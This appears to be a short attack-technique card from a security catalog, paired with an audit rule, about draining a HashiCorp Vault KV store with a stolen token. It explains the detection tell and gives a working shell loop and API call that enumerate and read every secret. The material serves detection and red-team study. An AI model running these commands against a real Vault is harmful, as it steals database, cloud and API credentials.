---
id: vault-secret-exfil
title: Bulk KV secret read (exfil the vault)
section: HashiCorp Vault / secrets
phase: Credential Access
attack:
  tactic: TA0006
  techniques: [T1555]
platform: [vault]
source: HashiCorp Vault post-compromise (secret-store exfil)
pair: vault-secret-read-audit
---

With a stolen token (or an over-broad policy), walk the KV store and read every
secret — DB creds, cloud keys, API tokens — draining the credential store in one sweep.
A single read is normal (every app reads its secret); the tell is one token reading
**many distinct paths** in a short window, or reading outside its usual set. Each read
writes a Vault audit record (`request.operation=read` on a `secret/` path). (Secrets
store — no on-host target, so no slots.)

```sh
# enumerate then bulk-read every KV secret with the stolen token
vault kv list -format=json secret/ | jq -r '.[]' | while read p; do vault kv get -format=json "secret/$p"; done
# or via the API:
curl -s -H "X-Vault-Token: <token>" "https://<vault>:8200/v1/secret/data/<path>"
```
